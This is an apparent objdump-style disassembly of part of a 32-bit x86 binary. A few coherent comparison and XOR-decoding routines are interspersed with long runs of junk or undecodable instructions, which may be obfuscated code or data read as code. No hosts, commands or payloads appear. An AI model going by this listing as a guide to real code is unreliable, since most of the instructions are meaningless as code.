  4039d4:	lds    edx,FWORD PTR [edx-0x33]
  4039d7:	lock and BYTE PTR [edi+0x3f],bl
  4039db:	(bad)  
  4039dc:	mov    ebx,0x1a4546f5
  4039e1:	jg     0x4039b5
  4039e3:	stc    
  4039e4:	fucomi st,st(5)
  4039e6:	bswap  ecx
  4039e8:	xor    ah,al
  4039ea:	lea    edi,[ebp+ecx*4+0x7a]
  4039ee:	imul   ebp,DWORD PTR ds:0x32336da9,0x3a
  4039f5:	push   ds
  4039f6:	ficomp DWORD PTR [edx+0x77]
  4039f9:	ror    bh,1
  4039fb:	sbb    eax,0x2896f8c
  403a00:	mov    eax,DWORD PTR [ebp-0x8]
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xa05849a
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403ab1
  403a5b:	mov    al,0x44
  403a5d:	stos   BYTE PTR es:[edi],al
  403a5e:	jp     0x403a37
  403a60:	xchg   ebx,eax
  403a61:	sub    DWORD PTR [esi+0x35],ebp
  403a64:	jmp    0xf2f7a321
  403a69:	lds    edx,FWORD PTR [eax+0x9db63f6]
  403a6f:	popa   
  403a70:	mov    bh,0xb9
  403a72:	push   ebx
  403a73:	xchg   ecx,eax
  403a74:	fidivr DWORD PTR [esi]
  403a76:	mov    DWORD PTR ds:0x3fc0e7e1,eax
  403a7c:	shl    DWORD PTR [edi],cl
  403a7e:	dec    edx
  403a7f:	mov    dl,BYTE PTR ds:0xa2d3dbc5
  403a85:	jl     0x403acf
  403a87:	push   0xa23cf146
  403a8c:	shl    BYTE PTR ss:[ecx+0x6899bfdb],cl
  403a93:	aaa    
  403a94:	add    cl,ch
  403a96:	loop   0x403a50
  403a98:	push   ebx
  403a99:	and    BYTE PTR [ebx-0x55],ch
  403a9c:	mov    edi,0xcce70847
  403aa1:	mov    dh,0xce
  403aa3:	in     al,0xb6
  403aa5:	mov    ecx,0xccfdda19
  403aaa:	dec    eax
  403aab:	scas   al,BYTE PTR es:[edi]
  403aac:	call   0x6516:0x4de92497
  403ab3:	mov    ah,0xad
  403ab5:	scas   eax,DWORD PTR es:[edi]
  403ab6:	push   ecx
  403ab7:	mov    ds:0xc295701e,eax
  403abc:	xor    bl,bl
  403abe:	lds    ebp,FWORD PTR [edi]
  403ac0:	out    dx,al
  403ac1:	cmp    DWORD PTR [esp+eiz*2+0x11d3da1b],esp
  403ac8:	jmp    0x3107fae2
  403acd:	int3   
  403ace:	sub    ebx,ebx
  403ad0:	and    eax,0xf89eb2be
  403ad5:	pop    edi
  403ad6:	or     cl,BYTE PTR [esi]
  403ad8:	add    eax,0xe6c460f0
  403add:	sbb    ch,dh
  403adf:	sub    eax,0xcdc10fe4
  403ae4:	pop    ds
  403ae5:	mov    edi,0xfec4ab6e
  403aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403aeb:	mov    ecx,0x9b27bf10
  403af0:	mov    BYTE PTR [ebp+0x55fa8dd9],al
  403af6:	cdq    
  403af7:	imul   ebp,esi,0xffffffff
  403afa:	xchg   edx,eax
  403afb:	jmp    0x4ff9:0x45ad191e
  403b02:	mov    dh,0x52
  403b04:	xchg   esi,eax
  403b05:	shl    BYTE PTR cs:0xe6988842,cl
  403b0c:	xchg   BYTE PTR [ecx],dh
  403b0e:	into   
  403b0f:	inc    esi
  403b10:	aam    0x51
  403b12:	or     BYTE PTR [ebx],bl
  403b14:	xor    eax,0xbc3c2d41
  403b19:	pushf  
  403b1a:	lods   al,BYTE PTR ds:[esi]
  403b1b:	imul   eax,DWORD PTR [ebx+0x8],0xffffffd6
  403b1f:	adc    BYTE PTR [edi],al
  403b21:	mov    ds:0xa989e6ec,al
  403b26:	push   ebx
  403b27:	add    ch,dh
  403b29:	mov    esp,0xa7d99006
  403b2e:	hlt    
  403b2f:	ins    BYTE PTR es:[edi],dx
  403b30:	(bad)  
  403b31:	js     0x403b4b
  403b33:	xchg   ebx,eax
  403b34:	lds    esp,FWORD PTR [edx-0x56]
  403b37:	sahf   
  403b38:	sub    esp,DWORD PTR [eax+0x2c77fe]
  403b3e:	icebp  
  403b3f:	adc    DWORD PTR [ebx+0x57],ebx
  403b42:	in     al,0xa
  403b44:	inc    esi
  403b45:	sub    bl,BYTE PTR [eax+0x59]
  403b48:	nop
  403b49:	(bad)  
  403b4a:	lods   al,BYTE PTR ds:[esi]
  403b4b:	xchg   edi,eax
  403b4c:	ror    DWORD PTR [edx],1
  403b4e:	mov    edx,0x365e2b4c
  403b53:	in     eax,0xb9
  403b55:	fisttp DWORD PTR [ecx+0x7547f310]
  403b5b:	sbb    ch,BYTE PTR [edx-0x6c]
  403b5e:	(bad)  
  403b60:	cmp    ebx,DWORD PTR [edi-0x87a0f7a]
  403b66:	xlat   BYTE PTR ds:[ebx]
  403b67:	test   eax,0x95979686
  403b6c:	imul   edi,edx,0x55
  403b6f:	js     0x403b60
  403b71:	test   al,0xd1
  403b73:	in     eax,dx
  403b74:	mov    bl,dl
  403b76:	std    
  403b77:	jge    0x403b3f
  403b79:	sub    DWORD PTR [edi+0x520bacb1],esi
  403b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b80:	shr    ecx,cl
  403b82:	sub    dl,cl
  403b84:	xor    edx,ebp
  403b86:	xchg   ecx,eax
  403b87:	xlat   BYTE PTR ds:[ebx]
  403b88:	push   0xf249f2d7
  403b8d:	scas   eax,DWORD PTR es:[edi]
  403b8e:	imul   ebp,DWORD PTR [ebp-0x1213f99e],0x9485d45b
  403b98:	stos   DWORD PTR es:[edi],eax
  403b99:	sub    ebx,DWORD PTR [esi+0x72a9226a]
  403b9f:	lods   al,BYTE PTR ds:[esi]
  403ba0:	jno    0x403bfd
  403ba2:	in     eax,dx
  403ba3:	mov    ah,0x8
  403ba5:	push   ebx
  403ba6:	mov    edx,0xbd8f2b09
  403bab:	xchg   DWORD PTR [esi+0x67],ebp
  403bae:	nop
  403baf:	les    edx,FWORD PTR [eax]
  403bb1:	dec    ebp
  403bb3:	xor    al,0xa6
  403bb5:	sub    BYTE PTR [esi-0x25c9d38c],0xce
  403bbc:	ss test al,0x4b
  403bbf:	xchg   ecx,eax
  403bc0:	bound  ebp,QWORD PTR [edx+0x7c]
  403bc3:	jg     0x403b64
  403bc5:	mov    eax,ds:0xf4346f52
  403bca:	ss jmp 0xc1e6806c
  403bd0:	out    0xc0,eax
  403bd2:	ror    DWORD PTR [esi],cl
  403bd4:	xchg   ebx,eax
  403bd5:	mov    esp,0xe345b08f
  403bda:	mov    cl,0xa5
  403bdc:	nop
  403bdd:	int    0x7
  403bdf:	jnp    0x403bc4
  403be1:	mov    ah,0x7a
  403be3:	jmp    0x6e06:0x817456b9
  403bea:	std    
  403beb:	gs (bad) 
  403bed:	setne  bh
  403bf0:	push   0xf833534
  403bf5:	nop
  403bf6:	in     al,dx
  403bf7:	(bad)  
  403bf8:	jns    0x403c69
  403bfa:	sub    bh,BYTE PTR [esi+ebp*1]
  403bfd:	lds    edx,FWORD PTR [ebx-0x53]
  403c00:	in     eax,dx
  403c01:	and    dl,bl
  403c03:	enter  0xf1a7,0x79
  403c07:	test   DWORD PTR [eax-0x24],ebx
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x95dcf48b
  403c29:	shr    BYTE PTR [ecx+0x7e1e42e5],1
  403c2f:	jle    0x403bdf
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c35
  403c35:	neg    DWORD PTR [ecx+0x589abfad]
  403c3b:	(bad)  
  403c3c:	aam    0x23
  403c3e:	mov    BYTE PTR [ecx+0x6da1c2ff],ch
  403c44:	in     eax,dx
  403c45:	and    DWORD PTR [ebx+0x7925324],0xffffffeb
  403c4c:	int    0x58
  403c4e:	xlat   BYTE PTR ds:[ebx]
  403c4f:	pop    es
  403c50:	xchg   esi,eax
  403c51:	test   DWORD PTR [eax],0xba3f491a
  403c57:	out    dx,eax
  403c58:	mov    ebp,0xd28328dc
  403c5d:	sub    DWORD PTR [ebx],eax
  403c5f:	xchg   edx,eax
  403c60:	xchg   BYTE PTR [ebx],cl
  403c62:	(bad)  
  403c63:	mov    ch,0x41
  403c65:	mov    al,ds:0x8464f19d
  403c6a:	mov    al,ds:0x20869157
  403c6f:	inc    edx
  403c70:	adc    bl,cl
  403c72:	ins    BYTE PTR es:[edi],dx
  403c73:	cmp    eax,0x57285c99
  403c78:	ins    BYTE PTR es:[edi],dx
  403c79:	jg     0x403c73
  403c7b:	fbstp  TBYTE PTR [ecx+0x2]
  403c7e:	dec    edi
  403c7f:	sbb    eax,0x17780c79
  403c84:	les    esi,FWORD PTR [ecx+0x13]
  403c87:	add    al,0x73
  403c89:	pop    edi
  403c8a:	repnz outs dx,BYTE PTR ds:[esi]
  403c8c:	xchg   edi,eax
  403c8d:	xchg   esp,eax
  403c8e:	xchg   edi,eax
  403c90:	push   0xffffffe0
  403c92:	in     eax,0xd7
  403c94:	dec    edi
  403c95:	mov    ds:0x26b4e9d3,al
  403c9a:	sub    DWORD PTR [edi-0x56],esi
  403c9d:	adc    ah,BYTE PTR [ebp+0x49]
  403ca0:	mov    BYTE PTR [edi+0x4243e6d9],al
  403ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca7:	aaa    
  403ca8:	ja     0x403c75
  403caa:	out    0x4a,eax
  403cac:	jae    0x403c5d
  403cae:	les    edx,FWORD PTR [esi+0x62372a1b]
  403cb4:	xchg   ebp,eax
  403cb5:	fcom   QWORD PTR [ebp+0x42]
  403cb8:	inc    ebx
  403cb9:	pop    ebp
  403cba:	retf   0xd56
  403cbd:	sbb    DWORD PTR [edi+0x5915c020],ebp
  403cc3:	ds xchg esi,eax
  403cc5:	(bad)  
  403cc6:	jbe    0x403c93
  403cc8:	inc    eax
  403cc9:	or     esp,0x39654b20
  403ccf:	ror    DWORD PTR [esi-0x3d],0x9a
  403cd3:	sub    al,0xf7
  403cd5:	mov    al,0xf1
  403cd7:	adc    eax,0x73084025
  403cdc:	cld    
  403cdd:	sbb    bh,BYTE PTR [ebx]
  403cdf:	icebp  
  403ce0:	mov    ebx,0xc39e59bb
  403ce5:	push   eax
  403ce6:	jmp    0xae937835
  403ceb:	ret    
  403cec:	mov    DWORD PTR [ebx],0x3acb970f
  403cf2:	bound  ebp,QWORD PTR [edx+0x38]
  403cf5:	inc    eax
  403cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf7:	(bad)  
  403cf8:	hlt    
  403cf9:	je     0x403d48
  403cfb:	fs jmp 0xefc73c16
  403d01:	dec    ebx
  403d02:	inc    ebp
  403d03:	call   0x91cc:0xdd4cce5c
  403d0a:	adc    esi,DWORD PTR ds:0x9caf618a
  403d10:	mov    dl,0xdd
  403d12:	mov    esi,0x9c4c271e
  403d17:	ss sub ebx,DWORD PTR ss:[eax]
  403d1b:	sub    esp,DWORD PTR gs:[ecx]
  403d1e:	jae    0x403ca1
  403d20:	and    eax,0x97de5902
  403d25:	xor    eax,0xaa21aa82
  403d2a:	mov    BYTE PTR [eax],cl
  403d2c:	ins    DWORD PTR es:[edi],dx
  403d2d:	and    ah,ah
  403d2f:	sbb    DWORD PTR [eax+0x4f931b02],0xffffff9e
  403d36:	scas   eax,DWORD PTR es:[edi]
  403d37:	sub    ecx,edi
  403d39:	iret   
  403d3a:	addr16 retf 0x6c65
  403d3e:	sbb    eax,0x1ea2f672
  403d43:	push   ss
  403d44:	cs nop
  403d46:	or     BYTE PTR [edx-0x48],bh
  403d49:	mov    ds,WORD PTR [ecx+eax*2+0x5de399ae]
  403d50:	loop   0x403dc4
  403d52:	fistp  QWORD PTR [edi]
  403d54:	outs   dx,DWORD PTR ds:[esi]
  403d55:	adc    DWORD PTR [edx-0x5184c2ef],edi
  403d5b:	sbb    eax,0x933fc4ad
  403d60:	adc    DWORD PTR [edi],ebp
  403d62:	imul   edi,DWORD PTR [edx-0x16917662],0xfa953072
  403d6c:	mov    ebx,0x72845bb
  403d71:	mov    ah,0xd4
  403d73:	jmp    0x7f1bd1b1
  403d78:	stos   DWORD PTR es:[edi],eax
  403d79:	push   ds
  403d7a:	or     eax,0xa2133d2d
  403d7f:	popa   
  403d80:	fmul   st(3),st
  403d83:	lahf   
  403d84:	outs   dx,DWORD PTR ds:[esi]
  403d85:	pop    ebx
  403d86:	and    eax,0x3ac19468
  403d8b:	jno    0x403d28
  403d8d:	xor    eax,0xfb454ff3
  403d92:	mov    bl,0x86
  403d94:	mov    edx,0x332deb17
  403d99:	in     eax,0xf4
  403d9b:	ins    BYTE PTR es:[edi],dx
  403d9c:	mov    al,ds:0xba72ff52
  403da1:	mov    ebp,0x94ba5527
  403da6:	mov    bl,0xe4
  403da8:	shr    DWORD PTR [ebp+edx*2-0x48481fb3],cl
  403daf:	fist   WORD PTR [ebx-0x2e]
  403db2:	inc    eax
  403db3:	es out dx,al
  403db5:	xor    BYTE PTR [edx],0x26
  403db8:	lods   al,BYTE PTR ds:[esi]
  403db9:	mov    esp,0xad442c8c
  403dbe:	test   eax,0x8c5b3d6
  403dc3:	test   eax,0x33ee9cb7
  403dc8:	ss mov ebx,0xdecc23a4
  403dce:	js     0x403d9a
  403dd0:	cmp    bl,BYTE PTR [edx+0x2f3d32ec]
  403dd6:	hlt    
  403dd7:	mov    cl,0xcb
  403dd9:	xchg   ecx,eax
  403dda:	sub    ah,BYTE PTR [edi]
  403ddc:	push   ecx
  403ddd:	fisttp DWORD PTR [ebx+0x28e6f7f2]
  403de3:	jmp    0xec45:0x89e8458d
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x7e39a381],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403dcc
  403e11:	and    DWORD PTR cs:[edx-0x39],eax
  403e15:	call   0x6f9f91da
  403e1a:	mov    dl,0xea
  403e1c:	test   BYTE PTR [ebp+0x11],0x41
  403e20:	mov    al,0x69
  403e22:	imul   ebx,DWORD PTR ds:0x9c213a5f,0x44bb6c67
  403e2c:	es inc ecx
  403e2e:	add    DWORD PTR [esi+ebx*8+0x4e],eax
  403e32:	and    eax,0xfbc0a28f
  403e37:	dec    edx
  403e38:	sbb    eax,0x324e9348
  403e3d:	retf   
  403e3e:	(bad)  
  403e3f:	mov    bl,0x78
  403e41:	fs push 0xffffffb8
  403e44:	in     eax,0x18
  403e46:	jl     0x403e8c
  403e48:	outs   dx,BYTE PTR ds:[esi]
  403e49:	jmp    0x403eca
  403e4b:	stc    
  403e4c:	in     al,0xce
  403e4e:	push   es
  403e4f:	pop    ebp
  403e50:	shl    BYTE PTR [esi-0x50],1
  403e53:	jl     0x403ddc
  403e55:	(bad)  
  403e56:	sbb    cl,bh
  403e58:	leave  
  403e59:	ins    BYTE PTR es:[edi],dx
  403e5a:	data16 mov dl,ah
  403e5d:	outs   dx,DWORD PTR ds:[esi]
  403e5e:	sub    al,0x18
  403e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e61:	pop    ecx
  403e62:	dec    eax
  403e63:	inc    esi
  403e64:	jns    0x403e5d
  403e66:	push   cs
  403e67:	push   ds
  403e68:	nop
  403e69:	rcl    BYTE PTR [esi+0x34],cl
  403e6c:	pop    ebp
  403e6d:	leave  
  403e6e:	cmp    al,0x8c
  403e70:	cmp    BYTE PTR [edi+0x27],bl
  403e73:	add    eax,0xcadc49a8
  403e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e79:	xchg   ebp,eax
  403e7a:	int    0x7
  403e7c:	push   esp
  403e7d:	pushf  
  403e7e:	dec    edx
  403e7f:	cmp    eax,esi
  403e81:	mov    edi,0x73d10301
  403e86:	adc    eax,0xdc17845d
  403e8b:	ret    
  403e8c:	test   al,0x9d
  403e8e:	es js  0x403e5e
  403e91:	jg     0x403eed
  403e93:	inc    bp
  403e95:	xor    eax,DWORD PTR [ecx-0x6b613fc6]
  403e9b:	mov    bh,0x35
  403e9d:	inc    esi
  403e9e:	ret    
  403e9f:	jno    0x403ee5
  403ea1:	shl    DWORD PTR es:[edi+0x10],cl
  403ea5:	ins    DWORD PTR es:[edi],dx
  403ea6:	jo     0x403f19
  403ea8:	pop    eax
  403ea9:	jl     0x403e35
  403eab:	out    0x59,eax
  403ead:	mov    edx,0x9f64545c
  403eb2:	aad    0x80
  403eb4:	mov    ebx,0x491590ee
  403eb9:	cmp    eax,0xca080d93
  403ebe:	adc    ah,BYTE PTR [ebp-0x3a]
  403ec1:	pop    esp
  403ec2:	and    DWORD PTR [eax+0x64d4e459],0x5245db7d
  403ecc:	ror    BYTE PTR [ebx-0x57],0x59
  403ed0:	aas    
  403ed1:	push   cs
  403ed2:	push   ss
  403ed3:	shl    DWORD PTR [esi+0x268446e0],cl
  403ed9:	retf   0x69be
  403edc:	dec    edi
  403edd:	(bad)  
  403ede:	retf   0x80f8
  403ee1:	mov    ds,WORD PTR [edi+0x7f]
  403ee4:	pop    esi
  403ee5:	imul   edi,DWORD PTR [edi],0xffffffb8
  403ee8:	out    0x36,al
  403eea:	adc    edx,DWORD PTR [esi]
  403eec:	inc    eax
  403eed:	xlat   BYTE PTR ds:[ebx]
  403eee:	inc    ecx
  403eef:	imul   ebx,DWORD PTR [ecx+0x36],0x7a
  403ef3:	(bad)  
  403ef4:	fstp   QWORD PTR [edx+0x22]
  403ef7:	mov    esp,0xb929d2f2
  403efc:	sahf   
  403efd:	xor    ch,BYTE PTR [ebx-0x519175a4]
  403f03:	repz repz mov WORD PTR [esi+eax*1-0x1a53d35b],gs
  403f0c:	push   DWORD PTR [esi-0x29]
  403f0f:	push   ds
  403f10:	or     eax,edx
  403f12:	arpl   WORD PTR [esi-0x68],bx
  403f15:	sbb    edx,DWORD PTR [ecx+0x250b9935]
  403f1b:	mov    dh,0x99
  403f1d:	or     DWORD PTR [edx-0x207aeba5],ebp
  403f23:	icebp  
  403f24:	push   ecx
  403f25:	inc    ebx
  403f26:	imul   DWORD PTR [edi+0x164d4521]
  403f2c:	stos   DWORD PTR es:[edi],eax
  403f2d:	dec    esp
  403f2e:	cmp    eax,0x333e458d
  403f33:	and    eax,0xec1bd2f
  403f38:	popa   
  403f39:	aad    0x31
  403f3b:	xchg   BYTE PTR [ecx+0x7b],bl
  403f3e:	iret   
  403f3f:	daa    
  403f40:	xor    bl,BYTE PTR [edx]
  403f42:	mov    edx,0x2f5697dc
  403f47:	mov    edi,0x7790c643
  403f4c:	mov    bh,0x1a
  403f4e:	xor    al,0x6
  403f50:	pusha  
  403f51:	add    bh,BYTE PTR [ecx]
  403f53:	addr16 cli 
  403f55:	add    BYTE PTR [ecx],dl
  403f57:	and    al,0x99
  403f59:	mov    cl,0x8e
  403f5b:	std    
  403f5c:	arpl   WORD PTR [eax],cx
  403f5e:	sbb    ebp,DWORD PTR [edx+0x30b2b322]
  403f64:	in     al,dx
  403f65:	stc    
  403f66:	(bad)  [edx]
  403f68:	push   cs
  403f69:	lods   al,BYTE PTR ds:[esi]
  403f6a:	cmp    eax,0x58550fc7
  403f6f:	cmp    eax,0xf0a0146
  403f74:	out    0x97,eax
  403f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f77:	or     eax,DWORD PTR [eax]
  403f79:	mov    ch,0x47
  403f7b:	xchg   edx,eax
  403f7c:	outs   dx,DWORD PTR ds:[esi]
  403f7d:	xchg   esp,eax
  403f7e:	jp     0x403fba
  403f80:	scas   eax,DWORD PTR es:[edi]
  403f81:	ins    BYTE PTR es:[edi],dx
  403f82:	out    dx,al
  403f83:	and    bh,BYTE PTR ds:0xc8dcc7ba
  403f89:	ja     0x403f6b
  403f8b:	stc    
  403f8c:	and    al,0xf2
  403f8e:	sub    esi,eax
  403f90:	mov    ebx,0xae1000f0
  403f95:	popa   
  403f96:	popa   
  403f97:	pusha  
  403f98:	or     eax,0x7e2311da
  403f9d:	xchg   ebp,eax
  403f9e:	inc    ebp
  403f9f:	push   ecx
  403fa0:	lods   al,BYTE PTR ds:[esi]
  403fa1:	mov    ds:0x142a85d9,al
  403fa6:	mov    ds:0x26ba9d51,eax
  403fab:	bound  ebx,QWORD PTR [eax]
  403fad:	scas   eax,DWORD PTR es:[edi]
  403fae:	loopne 0x403f99
  403fb0:	icebp  
  403fb1:	inc    ebp
  403fb2:	lock repnz mov eax,DWORD PTR [eax-0x69cc2829]
  403fba:	lods   eax,DWORD PTR cs:[esi]
  403fbc:	adc    eax,0x8bf1b837
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	adc    cl,BYTE PTR [edx+0x1a221f6e]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x404021
  403fe6:	jno    0x403fa9
  403fe8:	pusha  
  403fe9:	(bad)  
  403fec:	mov    ebp,0xc4c67a06
  403ff1:	js     0x403fe5
  403ff3:	add    eax,0xa569083
  403ff8:	or     bh,BYTE PTR [edi]
  403ffa:	adc    eax,0xdfa32b62
  403fff:	ss lahf 
  404001:	into   
  404002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404004:	xor    ebp,DWORD PTR [ecx]
  404006:	push   edx
  404007:	push   ebp
  404008:	mov    ecx,0x69e3ed49
  40400d:	jmp    0x68a:0x2df4e470
  404014:	into   
  404015:	jmp    0x403fb3
  404017:	add    DWORD PTR [edx+0x71be51f0],0x947a7939
  404021:	data16 mov ch,0xb
  404025:	jg     0x40405b
  404027:	jb     0x403fc6
  404029:	cmp    bh,dh
  40402b:	stc    
  40402c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40402d:	and    ch,BYTE PTR [esi+0x6af5a7f6]
  404033:	aad    0x5d
  404035:	test   DWORD PTR [esi+0x58],ebx
  404038:	into   
  404039:	dec    edx
  40403a:	dec    ecx
  40403b:	cmc    
  40403c:	in     eax,dx
  40403d:	shr    BYTE PTR [ebp-0x698d5160],1
  404043:	and    dl,BYTE PTR [eax-0x36]
  404046:	pusha  
  404047:	inc    esi
  404048:	es ds adc eax,0x17441811
  40404f:	pop    edi
  404050:	push   edx
  404051:	and    eax,0xc200ffe2
  404056:	cld    
  404057:	(bad)  
  404058:	push   0xaf01f27e
  40405d:	stc    
  40405e:	ret    
  40405f:	pop    eax
  404060:	mov    esp,0xc5a179f1
  404065:	add    BYTE PTR [ecx-0x59],ch
  404068:	(bad)  
  404069:	and    al,0x9
  40406b:	inc    ecx
  40406c:	or     al,0x53
  40406e:	mov    DWORD PTR [esi-0x5a],0x79e77e9
  404075:	mov    ds,WORD PTR [ebp+0x252763bb]
  40407b:	sub    eax,0x84620252
  404080:	imul   edi,DWORD PTR [ecx+0x50cbd4f5],0x56d70271
  40408a:	pushf  
  40408b:	repnz dec edi
  40408d:	test   eax,0x34c08aee
  404092:	and    ch,BYTE PTR [ebx-0x46]
  404095:	mov    eax,DWORD PTR [edi-0x3dbfb337]
  40409b:	aad    0x52
  40409d:	pop    DWORD PTR [esi]
  40409f:	ret    0xa045
  4040a2:	and    DWORD PTR ds:0x2f64a94a,eax
  4040a8:	adc    BYTE PTR [edx],dh
  4040aa:	cmp    al,0xcc
  4040ac:	dec    edx
  4040ad:	neg    BYTE PTR [ebx-0x74c3275d]
  4040b3:	pusha  
  4040b4:	jp     0x4040c9
  4040b6:	sar    al,1
  4040b8:	push   ebx
  4040b9:	cli    
  4040ba:	jo     0x4040e7
  4040bc:	rcr    DWORD PTR [edx+eax*4],1
  4040bf:	neg    BYTE PTR [edi]
  4040c1:	retf   0x1f41
  4040c4:	push   edi
  4040c5:	nop
  4040c6:	pop    ss
  4040c7:	cld    
  4040c8:	repz xchg ebp,eax
  4040ca:	dec    edi
  4040cb:	lea    ecx,[ebx-0x51b8e498]
  4040d1:	lods   al,BYTE PTR ds:[esi]
  4040d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d3:	aaa    
  4040d4:	jmp    0xff5f:0x4912effb
  4040db:	and    DWORD PTR [edx+0x31],ebx
  4040de:	popf   
  4040df:	ins    DWORD PTR es:[edi],dx
  4040e0:	jno    0x404063
  4040e2:	and    DWORD PTR [eax+0xb],eax
  4040e5:	loop   0x404126
  4040e7:	rcr    BYTE PTR [edx+esi*4+0xe],cl
  4040eb:	lods   al,BYTE PTR ds:[esi]
  4040ec:	iret   
  4040ed:	aaa    
  4040ee:	frstor [esp+ebp*2]
  4040f1:	ins    DWORD PTR es:[edi],dx
  4040f2:	fnsave [ebp+0x1aa0971e]
  4040f8:	inc    edx
  4040f9:	ins    BYTE PTR es:[edi],dx
  4040fa:	and    ecx,esp
  4040fc:	scas   eax,DWORD PTR es:[edi]
  4040fd:	lods   eax,DWORD PTR ds:[esi]
  4040fe:	fbstp  TBYTE PTR [eax]
  404100:	gs ss scas al,BYTE PTR es:[edi]
  404103:	out    0xbc,al
  404105:	sub    dl,BYTE PTR [ecx]
  404107:	mov    ch,0x7b
  404109:	cmp    ah,dl
  40410b:	push   ecx
  40410c:	outs   dx,BYTE PTR ds:[esi]
  40410d:	stc    
  40410e:	sbb    dh,BYTE PTR [edx+edx*4-0x72]
  404112:	push   esi
  404113:	fld    DWORD PTR [esi]
  404115:	test   DWORD PTR [eax],eax
  404117:	pop    ebp
  404118:	icebp  
  404119:	mov    eax,0xc61f1d42
  40411e:	push   cs
  40411f:	call   DWORD PTR [edi]
  404121:	nop
  404122:	xchg   ecx,eax
  404123:	mov    bh,0x26
  404125:	adc    esi,DWORD PTR [esi]
  404127:	gs dec eax
  404129:	(bad)  
  40412a:	and    ecx,DWORD PTR [ebx-0x61]
  40412d:	xchg   esp,eax
  40412e:	mov    edx,0x3958793f
  404133:	call   0xfe7b:0xb5063869
  40413a:	outs   dx,BYTE PTR ds:[esi]
  40413b:	or     DWORD PTR [edi-0x60],ecx
  40413e:	stos   DWORD PTR es:[edi],eax
  40413f:	mov    bl,0xfa
  404141:	lock fwait
  404143:	mov    ebp,0xdd6649ee
  404148:	pop    DWORD PTR [eax+0x277c4ca7]
  40414e:	jmp    0xb05bad9f
  404153:	cmp    DWORD PTR ds:0x31830fec,esp
  404159:	test   edx,ebp
  40415b:	out    0x67,eax
  40415d:	or     dh,BYTE PTR [ebp+0x3b9b4467]
  404163:	popf   
  404164:	add    esi,DWORD PTR [ecx-0x4]
  404167:	xchg   ebx,eax
  404168:	xchg   DWORD PTR [eax+0x69],edi
  40416b:	pop    eax
  40416c:	shl    BYTE PTR [esi-0x42],cl
  40416f:	lock pop ds
  404171:	(bad)  
  404172:	out    dx,eax
  404173:	push   ss
  404174:	adc    ebp,ebp
  404176:	xchg   edi,eax
  404177:	mov    al,ds:0x6ae34460
  40417c:	mov    bh,BYTE PTR [edi+0x12]
  40417f:	push   ecx
  404180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404181:	loopne 0x4041d9
  404183:	paddusw mm3,QWORD PTR [esi-0x2c]
  404187:	jno    0x404157
  404189:	adc    ecx,esp
  40418b:	dec    ecx
  40418c:	psubusb mm4,QWORD PTR [esi+0x186ce282]
  404193:	push   edi
  404194:	or     ecx,DWORD PTR [ebp+0x729b1084]
  40419a:	xor    al,BYTE PTR [eax]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
